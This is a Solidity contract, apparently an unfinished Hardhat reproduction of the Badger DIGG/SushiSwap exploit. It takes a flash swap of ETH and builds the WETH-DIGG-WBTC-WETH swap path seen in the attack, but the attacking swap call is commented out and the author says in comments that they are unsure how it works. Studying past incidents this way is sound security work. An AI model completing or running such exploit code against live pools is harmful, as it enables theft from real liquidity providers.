//SPDX-License-Identifier: Unlicense
pragma solidity ^0.7.0;

import "hardhat/console.sol";
import "./IUniswapV2Pair.sol";
import "./IUniswapV2ERC20.sol";
import "./UniswapV2Router02.sol";

// REKT article here: https://www.rekt.news/badgers-digg-sushi/
// TX here:
// Etehrscan: https://etherscan.io/tx/0x0af5a6d2d8b49f68dcfd4599a0e767450e76e08a5aeba9b3d534a604d308e60b
// Ethtx: https://ethtx.info/mainnet/0x0af5a6d2d8b49f68dcfd4599a0e767450e76e08a5aeba9b3d534a604d308e60b



contract Exploit {
  // this is the sushi router where they seem to have sent the first TX
  // it is labelled UniswapV2Router02 on etherscan
  UniswapV2Router02 sushiRouter = UniswapV2Router02(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
  // weth is 18 decimals
  IUniswapV2ERC20 weth = IUniswapV2ERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
  // digg is 9 decimals
  IUniswapV2ERC20 digg = IUniswapV2ERC20(0x798D1bE841a82a273720CE31c822C61a67a601C3);
  // wbtc is 8 decimals
  IUniswapV2ERC20 wbtc = IUniswapV2ERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
  // uniswap DAI/ETH pair, to borrow ETH for the TX
  IUniswapV2Pair pair = IUniswapV2Pair(0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11);

  uint borrowed = 1 ether;

  constructor() {
    // this is what they send first and what we need to borrow:
    // exploiter seems to:
    //sushiRouter.swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline);

  }
  function run() public {
    console.log(address(this).balance); 
    // function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    pair.swap(0, borrowed, address(this), "0x");
  }
  receive() external payable {}
  function uniswapV2Call(address,uint,uint,bytes calldata) external {

    // taking note from this link:
    // https://ethtx.info/mainnet/0x0af5a6d2d8b49f68dcfd4599a0e767450e76e08a5aeba9b3d534a604d308e60b
    // it would appear that the caller just calls swapExactETHForTokens. what I don't know is where or 
    // how that path is determined. 
    address[] memory path = new address[](4);
    path[0] = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    path[1] = 0x798D1bE841a82a273720CE31c822C61a67a601C3;
    path[2] = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599; 
    path[3] = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;


    //sushiRouter.swapExactETHForTokens(0, path, address(this), 115792089237316195423570985008687907853269984665640564039457584007913129639935);

    uint toReturn = (borrowed * 1004) / 1000;
    console.log(address(this).balance);    
    console.log(toReturn);    
    // return the borrowed eth
    console.log(address(msg.sender));    

    address payable returnTo = msg.sender;
    returnTo.transfer(toReturn);

  }

}
